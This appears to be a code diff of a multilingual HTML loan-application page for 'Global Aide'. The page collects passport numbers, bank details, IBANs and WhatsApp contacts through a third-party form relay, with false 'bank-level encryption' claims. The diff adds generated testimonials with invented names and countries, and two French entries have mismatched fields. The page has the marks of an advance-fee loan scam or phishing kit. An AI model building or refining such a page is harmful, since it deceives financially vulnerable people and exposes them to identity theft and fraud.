@@ -36,23 +36,19 @@
             <button onclick="changeLanguage('es')" class="bg-white/10 hover:bg-white/20 px-6 py-3 rounded-2xl border border-white/20 backdrop-blur-md transition-all font-bold">Español 🇪🇸</button>
             <button onclick="changeLanguage('de')" class="bg-white/10 hover:bg-white/20 px-6 py-3 rounded-2xl border border-white/20 backdrop-blur-md transition-all font-bold">Deutsch 🇩🇪</button>
         </div>
-        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-14 py-5 rounded-full font-black text-xl uppercase shadow-[0_10px_30px_rgba(250,204,21,0.4)] hover:scale-105 transition-all" id="btn-start">Commencer mon dossier</a>
+        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-14 py-5 rounded-full font-black text-xl uppercase shadow-xl hover:scale-105 transition-all" id="btn-start">Commencer mon dossier</a>
     </section>
 
     <section id="formulaire" class="max-w-6xl mx-auto -mt-16 mb-20 p-8 md:p-16 bg-white rounded-[3rem] shadow-2xl border border-gray-100">
         <div class="text-center mb-12">
-            <div class="inline-block p-3 bg-blue-100 rounded-2xl mb-4 text-blue-700">
-                <i class="fas fa-user-shield text-3xl"></i>
-            </div>
             <h2 class="text-4xl font-black text-blue-900 mb-4" id="form-title">Demande de Prêt Sécurisée</h2>
-            <p class="text-slate-500 font-medium" id="security-text">Vos données sont protégées par un cryptage de niveau bancaire.</p>
+            <p class="text-slate-500 font-medium" id="security-text"><i class="fas fa-shield-alt mr-2"></i>Vos données sont protégées par un cryptage de niveau bancaire.</p>
         </div>
         
         <form action="https://formspree.io/f/xnjqwngo" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-10" id="loanForm">
-            
             <div class="col-span-full bg-slate-50 p-8 rounded-3xl border border-slate-100">
-                <label class="block text-sm font-black mb-4 uppercase text-blue-800 tracking-widest" id="lbl-select-country">1. Sélection de votre pays</label>
-                <select id="country-select" name="pays" onchange="updateCountryData()" class="w-full p-5 bg-white border-2 border-slate-100 rounded-2xl text-black font-bold outline-none focus:border-blue-500 transition-all cursor-pointer shadow-sm">
+                <label class="block text-sm font-black mb-4 uppercase text-blue-800" id="lbl-select-country">1. Sélection de votre pays</label>
+                <select id="country-select" name="pays" onchange="updateCountryData()" class="w-full p-5 bg-white border-2 border-slate-100 rounded-2xl text-black font-bold outline-none focus:border-blue-500 transition-all shadow-sm">
                     <option value="France" data-code="+33" data-currency="€" id="opt-fr">🇫🇷 France</option>
                     <option value="Allemagne" data-code="+49" data-currency="€" id="opt-de">🇩🇪 Allemagne</option>
                     <option value="Ecuador" data-code="+593" data-currency="$" id="opt-ec">🇪🇨 Équateur</option>
@@ -62,48 +58,42 @@
                 </select>
             </div>
 
-            <div class="space-y-6">
-                <div>
-                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-nom">Nom complet</label>
-                    <input type="text" name="nom" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
-                </div>
-                <div>
-                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-id">N° de Pièce d'identité / Passeport</label>
-                    <input type="text" name="piece_identite" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
-                </div>
-                <div>
-                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-email">E-mail de contact</label>
-                    <input type="email" name="email_client" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
+            <div>
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-nom">Nom complet</label>
+                <input type="text" name="nom" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none text-black">
+            </div>
+            <div>
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-id">N° de Pièce d'identité / Passeport</label>
+                <input type="text" name="piece_identite" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none text-black">
+            </div>
+            <div>
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-email">E-mail de contact</label>
+                <input type="email" name="email_client" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none text-black">
+            </div>
+            <div>
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-tel">Numéro WhatsApp</label>
+                <div class="flex shadow-inner rounded-2xl overflow-hidden">
+                    <span id="phone-prefix" class="inline-flex items-center px-5 bg-slate-200 text-slate-700 font-bold border-r border-slate-300">+33</span>
+                    <input type="tel" name="telephone" required class="w-full p-4 bg-slate-50 outline-none text-black">
                 </div>
             </div>
-
-            <div class="space-y-6">
-                <div>
-                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-tel">Numéro WhatsApp</label>
-                    <div class="flex shadow-inner rounded-2xl overflow-hidden">
-                        <span id="phone-prefix" class="inline-flex items-center px-5 bg-slate-200 text-slate-700 font-bold border-r border-slate-300">+33</span>
-                        <input type="tel" name="telephone" required class="w-full p-4 bg-slate-50 outline-none focus:bg-white transition-all">
-                    </div>
-                </div>
-                <div>
-                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-montant">Montant souhaité</label>
-                    <div class="relative shadow-inner rounded-2xl overflow-hidden">
-                        <input type="number" name="montant" min="1000" max="500000" required class="w-full p-4 bg-slate-50 outline-none focus:bg-white transition-all">
-                        <span id="currency-display" class="absolute right-5 top-4 font-black text-blue-600 text-lg">€</span>
-                    </div>
-                </div>
-                <div>
-                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-banque">Institution Bancaire</label>
-                    <input type="text" name="banque" required class="w-full p-4 bg-blue-50/30 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
+            <div>
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-montant">Montant souhaité</label>
+                <div class="relative shadow-inner rounded-2xl overflow-hidden">
+                    <input type="number" name="montant" min="1000" max="500000" required class="w-full p-4 bg-slate-50 outline-none text-black">
+                    <span id="currency-display" class="absolute right-5 top-4 font-black text-blue-600">€</span>
                 </div>
             </div>
-
+            <div>
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-banque">Institution Bancaire</label>
+                <input type="text" name="banque" required class="w-full p-4 bg-blue-50/30 border rounded-2xl focus:bg-white outline-none text-black">
+            </div>
             <div class="col-span-full">
                 <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-iban">IBAN / Numéro de compte international</label>
-                <input type="text" name="iban" required class="w-full p-4 bg-blue-50/30 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
+                <input type="text" name="iban" required class="w-full p-4 bg-blue-50/30 border rounded-2xl focus:bg-white outline-none text-black">
             </div>
 
-            <button type="submit" class="col-span-full bg-blue-700 text-white p-7 rounded-3xl font-black text-2xl hover:bg-blue-800 shadow-2xl transition-all hover:-translate-y-1" id="btn-submit">
+            <button type="submit" class="col-span-full bg-blue-700 text-white p-7 rounded-3xl font-black text-2xl hover:bg-blue-800 shadow-2xl transition-all" id="btn-submit">
                 ENVOYER MON DOSSIER
             </button>
         </form>
@@ -111,29 +101,29 @@
 
     <section class="max-w-6xl mx-auto mb-24 px-6">
         <h3 class="text-center text-3xl font-black text-blue-900 mb-16 uppercase tracking-widest" id="test-title">Témoignages Clients</h3>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8" id="testimonial-container">
             <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-blue-50 relative">
                 <i class="fas fa-quote-left text-blue-100 text-5xl absolute top-6 left-6"></i>
-                <p class="relative z-10 text-slate-600 leading-relaxed italic" id="txt-test1">"Service exceptionnel. J'ai reçu les fonds en moins de 48 heures pour mon projet immobilier en France."</p>
+                <p class="relative z-10 text-slate-600 italic" id="txt-test1">...</p>
                 <div class="mt-8 flex items-center gap-4">
-                    <div class="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold">JP</div>
-                    <div><p class="font-bold">Jean-Pierre L.</p><p class="text-xs text-blue-500">🇫🇷 France</p></div>
+                    <div class="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold" id="avatar-1">ID</div>
+                    <div><p class="font-bold" id="name-test1">...</p><p class="text-xs text-blue-500" id="flag-test1">...</p></div>
                 </div>
             </div>
             <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-blue-50 relative">
                 <i class="fas fa-quote-left text-blue-100 text-5xl absolute top-6 left-6"></i>
-                <p class="relative z-10 text-slate-600 leading-relaxed italic" id="txt-test2">"Muy confiable. El proceso fue transparente y el equipo me ayudó en todo momento."</p>
+                <p class="relative z-10 text-slate-600 italic" id="txt-test2">...</p>
                 <div class="mt-8 flex items-center gap-4">
-                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white font-bold">MS</div>
-                    <div><p class="font-bold">Maria S.</p><p class="text-xs text-blue-500">🇪🇨 Ecuador</p></div>
+                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white font-bold" id="avatar-2">ID</div>
+                    <div><p class="font-bold" id="name-test2">...</p><p class="text-xs text-blue-500" id="flag-test2">...</p></div>
                 </div>
             </div>
             <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-blue-50 relative">
                 <i class="fas fa-quote-left text-blue-100 text-5xl absolute top-6 left-6"></i>
-                <p class="relative z-10 text-slate-600 leading-relaxed italic" id="txt-test3">"Global Aide offered me the best rate for my personal loan. Great international service."</p>
+                <p class="relative z-10 text-slate-600 italic" id="txt-test3">...</p>
                 <div class="mt-8 flex items-center gap-4">
-                    <div class="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center text-white font-bold">RD</div>
-                    <div><p class="font-bold">Robert D.</p><p class="text-xs text-blue-500">🇺🇸 USA</p></div>
+                    <div class="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center text-white font-bold" id="avatar-3">ID</div>
+                    <div><p class="font-bold" id="name-test3">...</p><p class="text-xs text-blue-500" id="flag-test3">...</p></div>
                 </div>
             </div>
         </div>
@@ -143,9 +133,6 @@
         <div class="max-w-4xl mx-auto">
             <div class="text-2xl font-black mb-6">GLOBAL AIDE</div>
             <p class="opacity-60 text-sm mb-8">© 2025 Global Aide Financial Solutions. Tous droits réservés.</p>
-            <div class="flex justify-center gap-6 opacity-60 text-xs uppercase tracking-widest">
-                <span>Privacy</span><span>Terms</span><span>Cookies</span>
-            </div>
         </div>
     </footer>
 
@@ -160,10 +147,33 @@
         }
 
         const translations = {
-            fr: { hero: "Soutien financier sérieux, honnête et rapide.", start: "Commencer mon dossier", title: "Demande de Prêt Sécurisée", security: "Vos données sont protégées par un cryptage de niveau bancaire.", selCountry: "1. Sélection de votre pays", countries: ["🇫🇷 France", "🇩🇪 Allemagne", "🇪🇨 Équateur", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Pérou"], nom: "Nom complet", id: "N° Pièce d'identité / Passeport", email: "E-mail de contact", tel: "WhatsApp", montant: "Montant souhaité", banque: "Institution Bancaire", iban: "IBAN / Compte", submit: "Envoyer mon dossier", thanks: "Merci ! Vous serez contacté d'ici 24h sur WhatsApp.", testTitle: "Témoignages Clients", tests: ["Service exceptionnel. Fonds reçus en 48h.", "Très fiable. Équipe transparente.", "Meilleurs taux pour mon prêt."] },
-            en: { hero: "Serious, honest and fast financial support.", start: "Start application", title: "Secure Loan Request", security: "Your data is protected by bank-level encryption.", selCountry: "1. Select your country", countries: ["🇫🇷 France", "🇩🇪 Germany", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Full Name", id: "ID / Passport Number", email: "Contact Email", tel: "WhatsApp", montant: "Amount", banque: "Banking Institution", iban: "IBAN / Account", submit: "Send file", thanks: "Thank you! You will be contacted within 24h on WhatsApp.", testTitle: "Client Testimonials", tests: ["Exceptional service. Funds received in 48h.", "Very reliable. Transparent team.", "Best rates for my personal loan."] },
-            es: { hero: "Apoyo financiero serio, honesto y rápido.", start: "Iniciar solicitud", title: "Solicitud de Préstamo", security: "Sus datos están protegidos con seguridad bancaria.", selCountry: "1. Selección de su país", countries: ["🇫🇷 Francia", "🇩🇪 Alemania", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panamá", "🇵🇪 Perú"], nom: "Nombre completo", id: "N° de Identificación / Pasaporte", email: "Correo de contacto", tel: "WhatsApp", montant: "Monto", banque: "Institución Bancaria", iban: "IBAN / Cuenta", submit: "Enviar solicitud", thanks: "¡Gracias! Se le contactará en 24h por WhatsApp.", testTitle: "Testimonios de Clientes", tests: ["Servicio excepcional. Fondos en 48h.", "Muy confiable. Proceso transparente.", "Las mejores tasas para mi préstamo."] },
-            de: { hero: "Seriöse und schnelle finanzielle Unterstützung.", start: "Antrag starten", title: "Sicherer Kreditantrag", security: "Bankgeprüfte Datensicherheit.", selCountry: "1. Wählen Sie Ihr Land", countries: ["🇫🇷 Frankreich", "🇩🇪 Deutschland", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Name", id: "Ausweisnummer / Reisepass", email: "E-Mail", tel: "WhatsApp", montant: "Betrag", banque: "Bankinstitut", iban: "IBAN / Konto", submit: "Senden", thanks: "Vielen Dank! Wir melden uns in 24h per WhatsApp.", testTitle: "Kundenbewertungen", tests: ["Außergewöhnlicher Service. Geld in 48h.", "Sehr zuverlässig. Transparent.", "Beste Zinsen für meinen Kredit."] }
+            fr: { hero: "Soutien financier sérieux, honnête et rapide.", start: "Commencer mon dossier", title: "Demande de Prêt Sécurisée", security: "Vos données sont protégées par un cryptage de niveau bancaire.", selCountry: "1. Sélection de votre pays", countries: ["🇫🇷 France", "🇩🇪 Allemagne", "🇪🇨 Équateur", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Pérou"], nom: "Nom complet", id: "N° Pièce d'identité / Passeport", email: "E-mail de contact", tel: "WhatsApp", montant: "Montant souhaité", banque: "Institution Bancaire", iban: "IBAN / Compte", submit: "Envoyer mon dossier", thanks: "Merci ! Vous serez contacté d'ici 24h sur WhatsApp.", testTitle: "Témoignages Clients" },
+            en: { hero: "Serious, honest and fast financial support.", start: "Start application", title: "Secure Loan Request", security: "Your data is protected by bank-level encryption.", selCountry: "1. Select your country", countries: ["🇫🇷 France", "🇩🇪 Germany", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Full Name", id: "ID / Passport Number", email: "Contact Email", tel: "WhatsApp", montant: "Amount", banque: "Banking Institution", iban: "IBAN / Account", submit: "Send file", thanks: "Thank you! You will be contacted within 24h on WhatsApp.", testTitle: "Client Testimonials" },
+            es: { hero: "Apoyo financiero serio, honesto y rápido.", start: "Iniciar solicitud", title: "Solicitud de Préstamo", security: "Sus datos están protegidos con seguridad bancaria.", selCountry: "1. Selección de su país", countries: ["🇫🇷 Francia", "🇩🇪 Alemania", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panamá", "🇵🇪 Perú"], nom: "Nombre completo", id: "N° de Identificación / Pasaporte", email: "Correo de contacto", tel: "WhatsApp", montant: "Monto", banque: "Institución Bancaria", iban: "IBAN / Cuenta", submit: "Enviar solicitud", thanks: "¡Gracias! Se le contactará en 24h por WhatsApp.", testTitle: "Testimonios de Clientes" },
+            de: { hero: "Seriöse und schnelle finanzielle Unterstützung.", start: "Antrag starten", title: "Sicherer Kreditantrag", security: "Bankgeprüfte Datensicherheit.", selCountry: "1. Wählen Sie Ihr Land", countries: ["🇫🇷 Frankreich", "🇩🇪 Deutschland", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Name", id: "Ausweisnummer / Reisepass", email: "E-Mail", tel: "WhatsApp", montant: "Betrag", banque: "Bankinstitut", iban: "IBAN / Konto", submit: "Senden", thanks: "Vielen Dank! Wir melden uns in 24h per WhatsApp.", testTitle: "Kundenbewertungen" }
+        };
+
+        const testimonialData = {
+            fr: [
+                {n: "Jean-Pierre L.", p: "🇫🇷 France", t: "Service exceptionnel. Fonds reçus en 48h."},
+                {n: "Lucie M.", t: "🇨🇦 Canada", p: "Simple, rapide et efficace. Merci Global Aide !"},
+                {n: "Marc O.", t: "🇧🇪 Belgique", p: "Très sérieux, je recommande pour vos projets."}
+            ],
+            en: [
+                {n: "Robert D.", p: "🇺🇸 USA", t: "Exceptional service. Funds received in 48h."},
+                {n: "Sarah J.", p: "🇬🇧 UK", t: "Very reliable. Transparent team and fast process."},
+                {n: "Kevin W.", p: "🇨🇦 Canada", t: "Best rates for my personal loan."}
+            ],
+            es: [
+                {n: "Maria S.", p: "🇪🇨 Ecuador", t: "Muy confiable. El proceso fue transparente."},
+                {n: "Carlos R.", p: "🇵🇦 Panama", t: "Excelente servicio, el dinero llegó a tiempo."},
+                {n: "Ana G.", p: "🇵🇪 Perú", t: "Gracias a Global Aide por financiar mi negocio."}
+            ],
+            de: [
+                {n: "Hans B.", p: "🇩🇪 Deutschland", t: "Außergewöhnlicher Service. Geld in 48h."},
+                {n: "Klaus M.", p: "🇦🇹 Österreich", t: "Sehr professionell und vertrauenswürdig."},
+                {n: "Julia S.", p: "🇨🇭 Schweiz", t: "Beste Zinsen für meinen Kredit."}
+            ]
         };
 
         function changeLanguage(lang) {
@@ -171,7 +181,7 @@
             document.getElementById('hero-sub').innerText = t.hero;
             document.getElementById('btn-start').innerText = t.start;
             document.getElementById('form-title').innerText = t.title;
-            document.getElementById('security-text').innerText = t.security;
+            document.getElementById('security-text').innerHTML = `<i class="fas fa-shield-alt mr-2"></i>${t.security}`;
             document.getElementById('lbl-select-country').innerText = t.selCountry;
             document.getElementById('lbl-nom').innerText = t.nom;
             document.getElementById('lbl-id').innerText = t.id;
@@ -182,11 +192,15 @@
             document.getElementById('lbl-iban').innerText = t.iban;
             document.getElementById('btn-submit').innerText = t.submit;
             document.getElementById('test-title').innerText = t.testTitle;
-            
-            // Témoignages
-            document.getElementById('txt-test1').innerText = `"${t.tests[0]}"`;
-            document.getElementById('txt-test2').innerText = `"${t.tests[1]}"`;
-            document.getElementById('txt-test3').innerText = `"${t.tests[2]}"`;
+
+            // Update Testimonials Dynamically
+            const tests = testimonialData[lang];
+            for (let i = 1; i <= 3; i++) {
+                document.getElementById(`txt-test${i}`).innerText = `"${tests[i-1].t}"`;
+                document.getElementById(`name-test${i}`).innerText = tests[i-1].n;
+                document.getElementById(`flag-test${i}`).innerText = tests[i-1].p;
+                document.getElementById(`avatar-${i}`).innerText = tests[i-1].n.substring(0,2);
+            }
 
             document.getElementById('loanForm').onsubmit = function() {
                 alert(t.thanks);
@@ -196,9 +210,13 @@
             const ids = ['opt-fr', 'opt-de', 'opt-ec', 'opt-sv', 'opt-pa', 'opt-pe'];
             ids.forEach((id, index) => { document.getElementById(id).innerText = t.countries[index]; });
         }
+
+        // Initialize with French
+        window.onload = () => { changeLanguage('fr'); };
     </script>
 </body>
-                    </html>
+</html>
+
     
         
                     
